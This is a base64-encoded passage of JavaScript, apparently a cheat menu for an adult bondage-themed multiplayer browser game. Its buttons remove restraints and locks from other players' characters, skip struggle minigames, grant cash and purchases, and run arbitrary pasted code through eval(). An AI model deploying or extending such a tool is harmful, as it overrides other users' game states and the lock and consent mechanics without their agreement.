cHgiOwogICAgYnV0dG9uLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKICAgIHJldHVybiBidXR0b247Cn0KCi8vIENyZWF0ZSBzZXBhcmF0b3IgZnVuY3Rpb24KZnVuY3Rpb24gY3JlYXRlU2VwYXJhdG9yKCkgewogICAgdmFyIHNlcGFyYXRvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImhyIik7CiAgICBzZXBhcmF0b3Iuc3R5bGUubWFyZ2luID0gIjVweCAwIjsKICAgIHJldHVybiBzZXBhcmF0b3I7Cn0KCi8vIEZ1bmN0aW9uIHRvIGRpc3BsYXkgY3VzdG9tIGNvbnRleHQgbWVudV9fX19fCmxldCBjb250ZXh0TWVudVRpbWVyID0gbnVsbDsKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY29udGV4dG1lbnUiLCBmdW5jdGlvbihldmVudCkgewogIGlmIChjb250ZXh0TWVudU9wZW4pIHsKICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7CiAgICByZXR1cm47IC8vIFByZXZlbnQgZHVwZSBtZW51cwogIH0KICBpZiAod2luZG93LmdldFNlbGVjdGlvbigpLnRvU3RyaW5nKCkgIT09ICcnKSB7CiAgICAvLyBBbGxvdyByZWd1bGFyIGNvbnRleHQgbWVudSB3aGVuIHRleHQgaXMgaGlnaGxpZ2h0ZWQKICAgIHJldHVybjsKICB9CiAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICB2YXIgY29udGV4dE1lbnUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICBjb250ZXh0TWVudS5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgY29udGV4dE1lbnUuc3R5bGUuYmFja2dyb3VuZCA9ICJsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCB3aGl0ZSwgd2hpdGUpIjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3hTaGFkb3cgPSAiMCAwIDNweCAjOTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiOHB4IjsKICBjb250ZXh0TWVudS5zdHlsZS56SW5kZXggPSAiOTk5OSI7CiAgY29udGV4dE1lbnUuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCBibGFjayI7CiAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICBpZiAoJ29udG91Y2hzdGFydCcgaW4gd2luZG93KSB7CiAgICAvLyBIYW5kbGUgbG9uZyBwcmVzcyBvbiBtb2JpbGUgZGV2aWNlcwogICAgY29udGV4dE1lbnVUaW1lciA9IHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LnRvdWNoZXNbMF0uY2xpZW50WSArICJweCI7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmxlZnQgPSBldmVudC50b3VjaGVzWzBdLmNsaWVudFggKyAicHgiOwogICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKICAgICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICAgIH0sIDUwMCk7CiAgfSBlbHNlIHsKICAgIC8vIEhhbmRsZSByaWdodCBjbGljayBvbiBkZXNrdG9wIGRldmljZXMKICAgIGNvbnRleHRNZW51LnN0eWxlLnRvcCA9IGV2ZW50LmNsaWVudFkgKyAicHgiOwogICAgY29udGV4dE1lbnUuc3R5bGUubGVmdCA9IGV2ZW50LmNsaWVudFggKyAicHgiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CiAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogIH0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgY2xlYXJUaW1lb3V0KGNvbnRleHRNZW51VGltZXIpOwogIH0pOwogICAgCgoKICAgIC8vIEhlYWRlciB3aXRoIEJDTSBsb2dvCiAgICB2YXIgaGVhZGVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBoZWFkZXIuc3R5bGUuZGlzcGxheSA9ICJmbGV4IjsKICAgIGhlYWRlci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICBoZWFkZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwoKICAgIHZhciBwcm9maWxlUGhvdG8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKICAgIHByb2ZpbGVQaG90by5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS53aWR0aCA9ICIzMHB4IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5oZWlnaHQgPSAiMzBweCI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjIwJSI7CiAgICBwcm9maWxlUGhvdG8uc3R5bGUubWFyZ2luUmlnaHQgPSAiMTBweCI7CgogICAgdmFyIGhlYWRlclRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGhlYWRlclRleHQuaW5uZXJIVE1MID0gIjxiPkVzc2VudGlhbHM8L2I+IjsKCiAgICBoZWFkZXIuYXBwZW5kQ2hpbGQocHJvZmlsZVBob3RvKTsKICAgIGhlYWRlci5hcHBlbmRDaGlsZChoZWFkZXJUZXh0KTsKCiAvLyBDdXN0b20gbWFpbiBidXR0b25zCiB2YXIgYnV0dG9uMSA9IGNyZWF0ZUJ1dHRvbigiUmVzdG9yZSBDaGFyYWN0ZXIiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6UGxheWVyLkFwcGVhcmFuY2UgPSBDaGF0U2VhcmNoU2FmZXdvcmRBcHBlYXJhbmNlLnNsaWNlKDApOyAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOyAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIAp9KTsKdmFyIGJ1dHRvbjIgPSBjcmVhdGVCdXR0b24oIkZvcmNlIFJvb20gU3dhcCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyksZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ0lucHV0Q2hhdCcpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLGRvY3VtZW50WydnZXRFbGVtZW50QnlJZCddKCdUZXh0QXJlYUNoYXRMb2cnKVsnc3R5bGUnXVsnZGlzcGxheSddPSdub25lJyxDaGF0U2VsZWN0U3RhcnRTZWFyY2goJ1gnKSxDaGF0Um9vbVNldExhc3RDaGF0Um9vbSgnJyk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uMyA9IGNyZWF0ZUJ1dHRvbigiRnJlZSBUYXJnZXQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhcmFjdGVyUmVsZWFzZVRvdGFsKEN1cnJlbnRDaGFyYWN0ZXIpLENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjQgPSBjcmVhdGVCdXR0b24oIlJlbW92ZSBSZXN0cmFpbnQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5VW5sb2NrKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIEludmVudG9yeVJlbW92ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjUgPSBjcmVhdGVCdXR0b24oIlRhcmdldCBTdHJ1Z2dsZSBEaWZmaWN1bHR5IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OmRve3ZhciBkaWZjPXByb21wdCgnRGlmZmljdWx0eVx4MjAxLTk2Jyk7fXdoaWxlKCEoZGlmYz49MHgxJiZkaWZjPD0weDYwKSk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGVhZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgyIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQXJtcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhhbmRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTGVncyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUV5ZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1GZWV0IiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRGV2aWNlcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFkZG9uIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVjayIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tSZXN0cmFpbnRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja0FjY2Vzc29yaWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQm9vdHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ib29kIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTm9zZSIsIGRpZmMpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNiA9IGNyZWF0ZUJ1dHRvbigiT3BlbiBUYXJnZXQgV2FyZHJvYmUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nQ2hhbmdlQ2xvdGhlcygpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjcgPSBjcmVhdGVCdXR0b24oIkNvbXBsZXRlIFN0cnVnZ2xlIE1pbmlnYW1lIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGphdmFzY3JpcHQ6U3RydWdnbGVQcm9ncmVzcyA9MTAwMDsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgfSwgNTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7Cgp2YXIgYnV0dG9uOCA9IGNyZWF0ZUJ1dHRvbigiSW52aXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICBIZWlnaHQ6ICItIgogICAgICB9OwogICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgCiAgICAgIHZpc2IgPSBmYWxzZTsKICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKCiAgICAKfSk7Cgp2YXIgYnV0dG9uOSA9IGNyZWF0ZUJ1dHRvbigiVmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6Q2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIHZpc2IgPSB0cnVlOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCiAgCn0pOwoKdmFyIGJ1dHRvbjEwID0gY3JlYXRlQnV0dG9uKCJDdXN0b20gU2NyaXB0IiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDp2YXIgc2NycCA9IHByb21wdCgiUGFzdGUgeW91ciBzY3JpcHQgaGVyZToiKTsKICBpZiAoc2NycCkgewogICAgZXZhbChzY3JwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICB9Cn0pOwovLyBUcmFuc2l0aW9uIHN0eWxpbmcgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24yLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjQuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b241LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjcuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b244LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjEwLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKCgoKLy9Ib3ZlciBldmVudHMgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKICAgIHRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwogICAgfSk7CmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7CiAgICB9KTsKCmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwLjVweCI7Cn0pOwpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgovL0Ryb3Bkb3duIE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIGZvcmNlY2xvc2VtZW51KCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgIERpYWxvZ0xlYXZlKCk7CiAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgfQoKIC8vIENyZWF0ZSB0aGUgZHJvcGRvd24gbWVudQp2YXIgc2VsZWN0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2VsZWN0Iik7CnNlbGVjdC5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLnBhZGRpbmcgPSAiNHB4IjsKc2VsZWN0LnN0eWxlLndpZHRoID0gIjIwMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblRvcCA9ICItMjBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5SaWdodCA9ICIycHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luQm90dG9tID0gIjNweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjJweCI7CnZhciBvcHRpb24xID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEudmFsdWUgPSAib3B0MSI7Cm9wdGlvbjEudGV4dCA9ICJQZXJzb25hbGlzYXRpb24gTWVudSI7Cm9wdGlvbjEuc2VsZWN0ZWQgPSB0cnVlOwpvcHRpb24xLmRpc2FibGVkID0gdHJ1ZTsKdmFyIG9wdGlvbjIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMi52YWx1ZSA9ICJvcHQyIjsKb3B0aW9uMi50ZXh0ID0gIkVkaXQgQ2FzaCI7CnZhciBvcHRpb24zID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjMudmFsdWUgPSAib3B0MyI7Cm9wdGlvbjMudGV4dCA9ICJNYXggU2tpbGxzIjsKdmFyIG9wdGlvbjQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNC52YWx1ZSA9ICJvcHQ0IjsKb3B0aW9uNC50ZXh0ID0gIk1heCBSZXB1dGF0aW9uIjsKdmFyIG9wdGlvbjUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNS52YWx1ZSA9ICJvcHQ1IjsKb3B0aW9uNS50ZXh0ID0gIlB1cmNoYXNlIEV2ZXJ5dGhpbmciOwp2YXIgb3B0aW9uNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb242LnZhbHVlID0gIm9wdDYiOwpvcHRpb242LnRleHQgPSAiUmVsZWFzZSBPd25lciBDb2xsYXIiOwp2YXIgb3B0aW9uNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb243LnZhbHVlID0gIm9wdDciOwpvcHRpb243LnRleHQgPSAiKzEgTEFSUCBMZXZlbCI7CnZhciBvcHRpb244ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjgudmFsdWUgPSAib3B0OCI7Cm9wdGlvbjgudGV4dCA9ICJCZWNvbWUgRXNjYXBlZCBQYXRpZW50IjsKdmFyIG9wdGlvbjkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uOS52YWx1ZSA9ICJvcHQ5IjsKb3B0aW9uOS50ZXh0ID0gIkJlY29tZSBDbHViIFNsYXZlIjsKdmFyIG9wdGlvbjEwID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEwLnZhbHVlID0gIm9wdDEwIjsKb3B0aW9uMTAudGV4dCA9ICJSZWxlYXNlIENsdWIgVGl0bGUiOwp2YXIgb3B0aW9uMTEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTEudmFsdWUgPSAib3B0MTEiOwpvcHRpb24xMS50ZXh0ID0gIlNldCBHR1RTIExldmVsIjsKdmFyIG9wdGlvbjEyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjEyLnZhbHVlID0gIm9wdDEyIjsKb3B0aW9uMTIudGV4dCA9ICJTZXQgRG9tL1N1YiBMZXZlbCI7CnZhciBvcHRpb24xMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMy52YWx1ZSA9ICJvcHQxMyI7Cm9wdGlvbjEzLnRleHQgPSAiU2V0IE5pY2tuYW1lIjsKdmFyIG9wdGlvbjE0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE0LnZhbHVlID0gIm9wdDE0IjsKb3B0aW9uMTQudGV4dCA9ICJGb3JjZSBPcmdhc20iOwp2YXIgb3B0aW9uMTUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTUudmFsdWUgPSAib3B0MTUiOwpvcHRpb24xNS50ZXh0ID0gIkJDTSBEaXNjb3JkIjsKdmFyIG9wdGlvbjE2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE2LnZhbHVlID0gIm9wdDE2IjsKb3B0aW9uMTYudGV4dCA9ICJGb3JjZSBMb2JieSI7CnZhciBvcHRpb24xNyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNy52YWx1ZSA9ICJvcHQxNyI7Cm9wdGlvbjE3LnRleHQgPSAiTEFSUCBPcHRpb25zIjsKdmFyIG9wdGlvbjE4ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE4LnZhbHVlID0gIm9wdDE4IjsKb3B0aW9uMTgudGV4dCA9ICJFbW90ZSBNZW51IChgICsgRSkiOwp2YXIgb3B0aW9uMTkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTkudmFsdWUgPSAib3B0MTkiOwpvcHRpb24xOS50ZXh0ID0gIlBlcnNpc3RhbnQgU2V0dGluZ3MgKGAgKyBTKSI7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjIpOwpzZWxlY3QuYXBwZW5k